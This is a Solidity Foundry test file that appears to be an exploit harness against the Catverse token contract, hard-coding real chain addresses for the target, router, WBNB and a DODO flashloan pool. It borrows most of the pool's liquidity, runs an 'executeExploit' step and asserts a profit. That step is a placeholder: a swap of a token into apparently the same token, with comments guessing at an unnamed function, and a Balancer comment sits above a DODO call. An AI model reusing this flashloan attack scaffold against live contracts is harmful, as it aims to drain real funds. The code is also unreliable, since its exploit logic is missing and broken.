// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface ICatverse {
    struct Fees {
        uint16 buyFee;
        uint16 sellFee;
        uint16 transferFee;
    }
    struct Ratios {
        uint16 rewards;
        uint16 marketing;
        uint16 buyback;
        uint16 jackpotBuy;
        uint16 jackpotSell;
        uint16 development;
        uint16 total;
    }
    struct TaxWallets {
        address marketing;
        address jackpotBuy;
        address jackpotSell;
        address buyback;
    }
    function _taxRates() external returns (Fees memory);
    function _ratios() external returns (Ratios memory);
    function maxBuyTaxes() external returns (uint256);
    function maxSellTaxes() external returns (uint256);
    function maxTransferTaxes() external returns (uint256);
    function maxRoundtripTax() external returns (uint256);
    function dexRouter() external returns (address);
    function lpPair() external returns (address);
    function DEAD() external returns (address);
    function _taxWallets() external returns (TaxWallets memory);
    function contractSwapEnabled() external returns (bool);
    function swapThreshold() external returns (uint256);
    function swapAmount() external returns (uint256);
    function piContractSwapsEnabled() external returns (bool);
    function piSwapPercent() external returns (uint256);
    function processReflect() external returns (bool);
    function tradingEnabled() external returns (bool);
    function _hasLiqBeenAdded() external returns (bool);
    function transferOwner(address) external;
    function renounceOwnership() external;
    function totalSupply() external pure returns (uint256);
    function decimals() external pure returns (uint8);
    function symbol() external pure returns (string memory);
    function name() external pure returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function approveContractContingency() external returns (bool);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function setNewRouter(address) external;
    function setLpPair(address,bool) external;
    function setInitializers(address,address) external;
    function isExcludedFromFees(address) external view returns (bool);
    function isExcludedFromDividends(address) external view returns (bool);
    function isExcludedFromLimits(address) external view returns (bool);
    function isExcludedFromProtection(address) external view returns (bool);
    function setExcludedFromLimits(address,bool) external;
    function setDividendExcluded(address,bool) external;
    function setExcludedFromFees(address,bool) external;
    function setExcludedFromProtection(address,bool) external;
    function setBlacklistEnabled(address,bool) external;
    function setBlacklistEnabledMultiple(address[] memory,bool) external;
    function isBlacklisted(address) external view returns (bool);
    function removeSniper(address) external;
    function setProtectionSettings(bool,bool) external;
    function enableTrading() external;
    function setTaxes(uint16,uint16,uint16) external;
    function setRatios(uint16,uint16,uint16,uint16,uint16,uint16) external;
    function setWallets(address,address,address,address,address) external;
    function setMaxTxPercent(uint256,uint256) external;
    function setMaxWalletSize(uint256,uint256) external;
    function getMaxTX() external view returns (uint256);
    function getMaxWallet() external view returns (uint256);
    function setSwapSettings(uint256,uint256,uint256,uint256) external;
    function setPriceImpactSwapAmount(uint256) external;
    function setContractSwapEnabled(bool,bool,bool) external;
    function setRewardsProperties(uint256,uint256,uint256) external;
    function setReflectorSettings(uint256) external;
    function excludePresaleAddresses(address,address) external;
    function multiSendTokens(address[] memory,uint256[] memory) external;
    function manualDeposit() external;
    function sweepContingency() external;
    function claimPendingRewards() external;
    function getTotalReflected() external view returns (uint256);
    function getUserInfo(address) external view returns (string memory,string memory,string memory,string memory);
    function getUserRealizedGains(address) external view returns (uint256);
    function getUserUnpaidEarnings(address) external view returns (uint256);
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0x89031AaFA457245469E9641387aa94BFB51cB964;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0x89031AaFA457245469E9641387aa94BFB51cB964;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
        // Approve the token for the router
        valuableToken.approve(address(uniswapRouter), amount);

        // Setup the path for the swap
        address[] memory path = new address[](2);
        path[0] = address(valuableToken); // token we are converting from
        path[1] = uniswapRouter.WETH(); // token we are converting to (WETH)

        // Perform the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, // we don't care about this value, just ensuring we get something
            path,
            address(this),
            block.timestamp
        );

        // Now we perform an operation to gain excess WETH
        // This should be the smart contract logic that generates profit

        // For instance, call the Catverse contract (this part depends on the logic of Catverse)
        // In the case of Catverse, we could interact with its functions that allow minting or liquidity
        // Assuming we have a function called someFunction that interacts properly

        // Recheck if we have sufficiently gained WETH
        uint256 finalBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
        require(finalBalance > amount, "Not enough WETH gained");
    }
}


